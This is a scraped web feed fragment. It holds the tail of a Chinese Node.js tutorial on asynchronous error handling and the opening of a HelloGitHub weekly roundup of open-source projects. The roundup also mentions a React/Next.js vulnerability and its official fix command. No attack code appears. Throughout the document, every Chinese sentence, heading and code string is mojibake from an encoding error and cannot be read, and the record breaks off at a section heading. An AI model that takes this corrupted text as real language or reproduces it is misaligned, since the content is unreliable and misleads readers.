<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">wrong</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>();
    }, <span class="hljs-number">1000</span>);
  }).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"é”™è¯¯"</span>);
  });
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-title function_">wrong</span>();
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ•è·ä¸åˆ°"</span>);
  }
}
</code></pre>
<p>åŸå› ï¼šæ²¡æœ‰ returnï¼Œå¯¼è‡´ run() æ— æ³•ç­‰å¾…é”™è¯¯æŠ›å‡ºã€‚</p>
<hr/>
<h3 data-id="heading-9">2. åœ¨ forEach ä¸­ä½¿ç”¨ await</h3>
<p>forEach ä¸èƒ½ç­‰å¾…å¼‚æ­¥ä»»åŠ¡ï¼Œå› æ­¤é”™è¯¯éš¾ä»¥æ•è·ã€‚</p>
<pre><code class="hljs language-js" lang="js">items.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">async</span> item =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">process</span>(item); <span class="hljs-comment">// é”™è¯¯æ— æ³•è¢«å¤–å±‚æ•è·</span>
});
</code></pre>
<p>æ­£ç¡®æ–¹å¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> items) {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">process</span>(item);
}
</code></pre>
<hr/>
<h3 data-id="heading-10">3. async å‡½æ•°ä¸­çš„æœªå¤„ç†é”™è¯¯æœ€ç»ˆä¼šå¯¼è‡´ Promise rejection</h3>
<p>å¦‚æœæ²¡æœ‰ try/catchï¼Œä¹Ÿæ²¡æœ‰è¢«å¤–å±‚ await æ•è·ï¼Œé”™è¯¯ä¼šå¼•å‘ <code>unhandledRejection</code>ã€‚</p>
<hr/>
<h2 data-id="heading-11">ä¸ƒã€å…¨å±€å±‚é¢çš„å¼‚å¸¸å¤„ç†</h2>
<p>å³ä½¿å¤„ç†äº†å¤§å¤šæ•°é”™è¯¯ï¼Œä»å¯èƒ½å‡ºç°æœªæ•è·é”™è¯¯ã€‚
Node.js æä¾›å…¨å±€äº‹ä»¶ç”¨äºå…œåº•ï¼š</p>
<h3 data-id="heading-12">1. æœªæ•è·çš„å¼‚å¸¸</h3>
<pre><code class="hljs language-js" lang="js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">"uncaughtException"</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æœªæ•è·å¼‚å¸¸ï¼š"</span>, err);
});
</code></pre>
<h3 data-id="heading-13">2. æœªæ•è·çš„ Promise é”™è¯¯</h3>
<pre><code class="hljs language-js" lang="js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">"unhandledRejection"</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æœªå¤„ç†çš„ Promise é”™è¯¯ï¼š"</span>, err);
});
</code></pre>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒï¼Œé€šå¸¸ä¼šè®°å½•æ—¥å¿—å¹¶å®‰å…¨é€€å‡ºï¼Œè€Œä¸æ˜¯ç»§ç»­è¿è¡Œã€‚</p>
<hr/>
<h2 data-id="heading-14">å…«ã€æœ€ä½³å®è·µæ€»ç»“</h2>
<ol>
<li>å›è°ƒå‡½æ•°ä¸­å§‹ç»ˆæ£€æŸ¥ err</li>
<li>Promise é“¾ä¸­ä½¿ç”¨ç»Ÿä¸€çš„ catch</li>
<li>async/await ä¸­ä½¿ç”¨ try/catch è¿›è¡Œå±€éƒ¨ä¿æŠ¤</li>
<li>æ‰¹é‡ä»»åŠ¡ä¼˜å…ˆé€‰æ‹© Promise.allSettled</li>
<li>é¿å…åœ¨ forEach ä¸­ä½¿ç”¨ await</li>
<li>å¿…é¡»ç›‘å¬ unhandledRejection å’Œ uncaughtException</li>
<li>å¯¹å¤–æš´éœ² API æ—¶é˜²æ­¢é”™è¯¯è¢«åæ‰</li>
</ol>
<p>é«˜è´¨é‡çš„å¼‚æ­¥é”™è¯¯å¤„ç†ä¸ä»…æå‡ç¨³å®šæ€§ï¼Œä¹Ÿèƒ½æ˜¾è‘—é™ä½ç»´æŠ¤æˆæœ¬ã€‚</p>
<hr/>
<h2 data-id="heading-15">ä¹ã€æ€»ç»“</h2>
<p>Node.js çš„å¼‚æ­¥é”™è¯¯å¤„ç†æœºåˆ¶çœ‹ä¼¼å¤æ‚ï¼Œä½†å®ƒéµå¾ªæ¸…æ™°è§„å¾‹ï¼š
å›è°ƒä¾èµ–é”™è¯¯ä¼˜å…ˆæ¨¡å¼ï¼ŒPromise ä¾èµ– catchï¼Œasync/await ä¾èµ– try/catchã€‚
ç†è§£æ¯ç§æ¨¡å¼çš„ç‰¹ç‚¹å’Œé€‚ç”¨åœºæ™¯ï¼Œå°±èƒ½å†™å‡ºå¯é ã€å¯ç»´æŠ¤çš„ Node.js æœåŠ¡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸Šç­æ‘¸é±¼ç©å¡”é˜²ï¼Œç«Ÿç„¶æ˜¯ä¸ºäº†å­¦æ¶æ„ï¼Ÿã€ŒGitHub çƒ­ç‚¹é€Ÿè§ˆã€]]></title>    <link>https://juejin.cn/post/7581738974424088595</link>    <guid>https://juejin.cn/post/7581738974424088595</guid>    <pubDate>2025-12-10T00:21:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581738974424088595" data-draft-id="7581664885862105098" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸Šç­æ‘¸é±¼ç©å¡”é˜²ï¼Œç«Ÿç„¶æ˜¯ä¸ºäº†å­¦æ¶æ„ï¼Ÿã€ŒGitHub çƒ­ç‚¹é€Ÿè§ˆã€"/> <meta itemprop="keywords" content="GitHub,å¼€æº"/> <meta itemprop="datePublished" content="2025-12-10T00:21:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloGitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1574156384091320"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸Šç­æ‘¸é±¼ç©å¡”é˜²ï¼Œç«Ÿç„¶æ˜¯ä¸ºäº†å­¦æ¶æ„ï¼Ÿã€ŒGitHub çƒ­ç‚¹é€Ÿè§ˆã€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1574156384091320/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloGitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:21:42.000Z" title="Wed Dec 10 2025 00:21:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a38f2672d0274178bb3dfd04f27f7471~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=%2FOUcfcAN3J5vh1A0Ov85W1EAVsI%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ çš„ç”Ÿäº§ç¯å¢ƒç”¨äº† NextJSâ€”â€”åŸºäº React çš„æµè¡Œå¼€æº Web å¼€å‘æ¡†æ¶ï¼Œé‚£ä¸Šå‘¨æœ«å¯èƒ½è¿‡å¾—å¹¶ä¸è½»æ¾ã€‚<strong>å— React é«˜å±æ¼æ´çš„å½±å“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ HTTP è¯·æ±‚æ”»å‡» NextJS é¡¹ç›®ï¼Œè¿œç¨‹æ‰§è¡Œä»»æ„æŒ‡ä»¤</strong>ã€‚å¦‚æœä½ ä¸ç¡®å®šé¡¹ç›®æ˜¯å¦å—å½±å“ï¼Œå¯ä»¥ä½¿ç”¨å®˜æ–¹æä¾›çš„å·¥å…·ï¼Œä¸€æ¡å‘½ä»¤ <code>npx fix-react2shell-next</code> å³å¯æ£€æŸ¥å’Œä¿®å¤è¯¥å®‰å…¨æ¼æ´ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cfe35892a874321b0333d99670291cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=jGMOyLUCpW%2BAf%2B6anSk7%2FlBn2vA%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>GitHub åœ°å€â†’<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvercel-labs%2Ffix-react2shell-next" target="_blank" title="https://github.com/vercel-labs/fix-react2shell-next" ref="nofollow noopener noreferrer">github.com/vercel-labsâ€¦</a></p>
</blockquote>
<p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ä¸Šå‘¨ GitHub åˆæœ‰å“ªäº›å¥½ç©çš„å¼€æºé¡¹ç›®ã€‚è¿‘æœŸï¼Œå¾®è½¯å¼€æºçš„æ”¯æŒ 90 åˆ†é’Ÿé«˜è´¨é‡é•¿è¯­éŸ³åˆæˆæ¡†æ¶ï¼Œè¿ç»­å¤šå¤©ç™»é¡¶çƒ­æ¦œã€‚è®©ä½ åœ¨â€œæ‘¸é±¼â€æ—¶å­¦ä¹ äº‘æ¶æ„çŸ¥è¯†çš„å¡”é˜²æ¸¸æˆ server-survivalï¼Œé™¤äº†ç•Œé¢æœ‰äº›ç®€é™‹ä½†çœŸèƒ½å­¦åˆ°ä¸œè¥¿ã€‚å¦‚æœä½ åœ¨å¯»æ‰¾ Vim çš„ç»ˆç«¯ç¼–è¾‘å™¨æ›¿ä»£å“ï¼Œå¯ä»¥è¯•è¯•æœ€è¿‘å¾ˆç«çš„æ–°é¡¹ç›® Freshï¼Œæ²¡ç‚¹ä¸œè¥¿ä¹Ÿä¸å¯èƒ½ä¸€å‘¨ Star ç ´åƒã€‚</p>
<p>æœ€åæ˜¯æ— éœ€å®¢æˆ·ç«¯ã€æµè§ˆå™¨è®¿é—®å°±èƒ½ç”¨çš„è¿œç¨‹æ¡Œé¢å·¥å…· CrossDeskï¼Œä»¥åŠå®Œå…¨å…è´¹ã€å¼€æºçš„ Android ç™½å™ªéŸ³åº”ç”¨ XMSLEEPï¼Œå¸®ä½ æ”¾æ¾ã€åŠ©ä½ å…¥çœ ã€‚</p>
<ul>
<li>æœ¬æ–‡ç›®å½•
<ul>
<li>1. çƒ­é—¨å¼€æºé¡¹ç›®
<ul>
<li>1.1 æ‰®æ¼”äº‘æ¶æ„å¸ˆçš„å¡”é˜²æ¸¸æˆï¼šserver-survival</li>
<li>1.2 ç§’å¼€å¤§æ–‡ä»¶çš„ç»ˆç«¯ç¼–è¾‘å™¨ï¼šFresh</li>
<li>1.3 å¼€ç®±å³ç”¨çš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼šalt-sendme</li>
<li>1.4 ä¸€å¥è¯ç”Ÿæˆå°çº¢ä¹¦çš„åˆ›ä½œå·¥å…·ï¼šRedInk</li>
<li>1.5 é•¿æ—¶é•¿å¤šè§’è‰²è¯­éŸ³åˆæˆæ¡†æ¶ï¼šVibeVoice</li>
</ul>
</li>
<li>2. HelloGitHub çƒ­è¯„
<ul>
<li>2.1 æ”¯æŒ Web ç«¯çš„è¿œç¨‹æ¡Œé¢å·¥å…·ï¼šCrossDesk</li>
<li>2.2 å¼€æºçš„ Android ç™½å™ªéŸ³åº”ç”¨ï¼šXMSLEEP</li>
</ul>
</li>
<li>3. ç»“å°¾</li>
</ul>
</li>
</ul>
<h2 data-id="heading-0">1. çƒ­é—¨å¼€æºé¡¹ç›®</h2>
<h3 data-id="heading-1">1.1 æ‰®æ¼”äº‘æ¶æ„å¸ˆçš„å¡”é˜²æ¸¸æˆï¼šserver-survival</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aeec31c921ac438c9bf4689a4fbaee3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=tIr4k0%2BC6TkEmXS1KuZB9ccWYbw%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸»è¯­è¨€ï¼šJavaScript</strong>ï¼Œ<strong>Starï¼š2.3k</strong>ï¼Œ<strong>å‘¨å¢é•¿ï¼š2k</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªåŸºäº Web çš„å¡”é˜²æ¨¡æ‹Ÿæ¸¸æˆï¼Œæ—¨åœ¨é€šè¿‡ç©æ¸¸æˆçš„æ–¹å¼å­¦ä¹ äº‘æ¶æ„çŸ¥è¯†ã€‚ç©å®¶åœ¨æ¸¸æˆä¸­æ‰®æ¼”äº‘æ¶æ„å¸ˆï¼Œåˆ©ç”¨æœ‰é™çš„é¢„ç®—æ­å»ºäº‘åŸºç¡€è®¾æ–½ã€‚é¢å¯¹æŒç»­å¢é•¿çš„è®¿é—®æµé‡å’Œ DDoS æ”»å‡»ï¼Œéœ€è¦åˆç†è§„åˆ’å’Œéƒ¨ç½²èµ„æºï¼Œå°½å¯èƒ½å»¶é•¿äº‘æœåŠ¡ç¨³å®šè¿è¡Œæ—¶é—´ï¼ˆç”Ÿå­˜æ›´é•¿æ—¶é—´ï¼‰ã€‚</p>
<blockquote>
<p>GitHub åœ°å€â†’<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpshenok%2Fserver-survival" target="_blank" title="https://github.com/pshenok/server-survival" ref="nofollow noopener noreferrer">github.com/pshenok/serâ€¦</a></p>
</blockquote>
<h3 data-id="heading-2">1.2 ç§’å¼€å¤§æ–‡ä»¶çš„ç»ˆç«¯ç¼–è¾‘å™¨ï¼šFresh</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/034d60cca1cb434e8b11d007b691bb86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=8deN%2BuY1YLdZ0TrB781mKi1p160%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸»è¯­è¨€ï¼šRust</strong>ï¼Œ<strong>Starï¼š1.4k</strong>ï¼Œ<strong>å‘¨å¢é•¿ï¼š1.3k</strong></p>
<p>è¿™æ˜¯ä¸€æ¬¾æ”¯æŒé¼ æ ‡æ“ä½œçš„ç»ˆç«¯æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œèƒ½å¤Ÿæµç•…ç¼–è¾‘ GB çº§å¤§æ–‡ä»¶ã€‚å®ƒå¼€ç®±å³ç”¨ã€ä¸Šæ‰‹ç®€å•ï¼Œå†…ç½® LSP å®¢æˆ·ç«¯ï¼Œæä¾›è‡ªåŠ¨è¡¥å…¨ã€è·³è½¬åˆ°å®šä¹‰ç­‰ IDE åŠŸèƒ½ï¼Œä»¥åŠ TypeScript æ’ä»¶ç³»ç»Ÿã€‚</p>
<blockquote>
<p>GitHub åœ°å€â†’<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsinelaw%2Ffresh" target="_blank" title="https://github.com/sinelaw/fresh" ref="nofollow noopener noreferrer">github.com/sinelaw/freâ€¦</a></p>
</blockquote>
<h3 data-id="heading-3">1.3 å¼€ç®±å³ç”¨çš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼šalt-sendme</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/332202d034154ad59481016bade649b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=XC7NLLecxHewG2aUkhlZXn9l3vk%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸»è¯­è¨€ï¼šRustã€TypeScript</strong>ï¼Œ<strong>Starï¼š4k</strong></p>
<p>è¿™æ˜¯ä¸€æ¬¾é‡‡ç”¨ Rust å’Œ Tauri æ„å»ºçš„å¼€æº P2P æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œæ— éœ€æ³¨å†Œå’ŒæœåŠ¡å™¨ï¼Œå³å¯å®ç°ç«¯åˆ°ç«¯çš„æ–‡ä»¶ä¼ è¾“ã€‚ç”¨æˆ·åªéœ€å°†æ–‡ä»¶æ‹–å…¥åº”ç”¨ï¼Œå°†éšæœºç”Ÿæˆçš„ä¼ è¾“å‡­è¯å‘ç»™æ¥æ”¶æ–¹ï¼Œå¯¹æ–¹è¾“å…¥åå³å¯è½»æ¾æ¥æ”¶æ–‡ä»¶ã€‚</p>
<blockquote>
<p>GitHub åœ°å€â†’<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftonyantony300%2Falt-sendme" target="_blank" title="https://github.com/tonyantony300/alt-sendme" ref="nofollow noopener noreferrer">github.com/tonyantony3â€¦</a></p>
</blockquote>
<h3 data-id="heading-4">1.4 ä¸€å¥è¯ç”Ÿæˆå°çº¢ä¹¦çš„åˆ›ä½œå·¥å…·ï¼šRedInk</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f63bc2a53904e389e3b5a52fe19e6f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=O7kLsjD9lJ4FOp%2F8SXljV1jY0Q4%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸»è¯­è¨€ï¼šPython</strong>ï¼Œ<strong>Starï¼š3.2k</strong>ï¼Œ<strong>å‘¨å¢é•¿ï¼š1k</strong></p>
<p>è¯¥é¡¹ç›®æ˜¯åŸºäº AI çš„ä¸€ç«™å¼å°çº¢ä¹¦å›¾æ–‡ç”Ÿæˆå·¥å…·ï¼Œåªéœ€è¾“å…¥ä¸€å¥è¯æè¿°ä¸»é¢˜ï¼Œå¹¶ä¸Šä¼ ä¸»é¡µæˆªå›¾ä½œä¸ºé£æ ¼å‚è€ƒï¼Œå³å¯è‡ªåŠ¨ç”ŸæˆåŒ…å«å°é¢å›¾å’Œå†…å®¹çš„å®Œæ•´å›¾æ–‡ç¬”è®°ï¼Œæ”¯æŒé‡æ–°ç”Ÿæˆå•é¡µå†…å®¹ã€å¤§çº²é¢„è§ˆå’Œç¼–è¾‘ç­‰åŠŸèƒ½ã€‚</p>
<blockquote>
<p>GitHub åœ°å€â†’<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHisMax%2FRedInk" target="_blank" title="https://github.com/HisMax/RedInk" ref="nofollow noopener noreferrer">github.com/HisMax/RedIâ€¦</a></p>
</blockquote>
<h3 data-id="heading-5">1.5 é•¿æ—¶é•¿å¤šè§’è‰²è¯­éŸ³åˆæˆæ¡†æ¶ï¼šVibeVoice</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6ee558b38c8453ba070539dde9bbe3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=xC6N5981xi%2Fzn91I4PIWax0adnM%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸»è¯­è¨€ï¼šPython</strong>ï¼Œ<strong>Starï¼š14k</strong>ï¼Œ<strong>å‘¨å¢é•¿ï¼š4k</strong></p>
<p>è¯¥é¡¹ç›®æ˜¯å¾®è½¯å¼€æºçš„æ–‡æœ¬è½¬è¯­éŸ³æ¡†æ¶ï¼Œæ—¨åœ¨è§£å†³ä¼ ç»Ÿ TTS ç³»ç»Ÿåœ¨ç”Ÿæˆé•¿ç¯‡å¹…ã€å¤šè§’è‰²å¯¹è¯æ—¶ï¼ˆåšå®¢ã€æœ‰å£°ä¹¦ï¼‰çš„ç—›ç‚¹ã€‚å®ƒèƒ½å¤ŸåŸºäºæ–‡æœ¬ï¼Œä¸€æ¬¡æ€§åˆæˆé•¿è¾¾ 90 åˆ†é’Ÿã€4 ä½ä¸åŒè§’è‰²å¯¹è¯çš„é«˜è´¨é‡é•¿éŸ³é¢‘ï¼Œæ”¯æŒä¸­æ–‡ã€è‹±è¯­ç­‰ 9 ç§è¯­è¨€ã€‚</p>
<blockquote>
<p>GitHub åœ°å€â†’<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2FVibeVoice" target="_blank" title="https://github.com/microsoft/VibeVoice" ref="nofollow noopener noreferrer">github.com/microsoft/Vâ€¦</a></p>
</blockquote>
<h2 data-id="heading-6">2. HelloGitHub çƒ­è¯„</h2>
<p>åœ¨æ­¤ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä¸ºå¤§å®¶ä»‹ç»æœ¬å‘¨ HelloGitHub ç½‘ç«™ä¸Šçš„çƒ­é—¨å¼€æºé¡¹ç›®ï¼Œå¸Œæœ›ä½ èƒ½ä»ä¸­æ”¶è·å¼€æºç¥å™¨å’Œç¼–ç¨‹çŸ¥è¯†ï¼Œæ›´æ¬¢è¿ä¸æˆ‘ä»¬åˆ†äº«ä½ åœ¨ä½¿ç”¨è¿™äº›<strong>å¼€æºé¡¹ç›®çš„ä½“éªŒå’Œè¯„ä»·</strong>ï¼Œç”¨æœ€çœŸå®åé¦ˆä¸ºå¼€æºé¡¹ç›®çš„ä½œè€…æä¾›åŠ¨åŠ›ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d178ca6ce8c476e86d77f3917be2b82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=TNd0BT9Z9WQ1sijZSQ%2B4XmBnKT8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">2.1 æ”¯æŒ Web ç«¯çš„è¿œç¨‹æ¡Œé¢å·¥å…·ï¼šCrossDesk</h3>
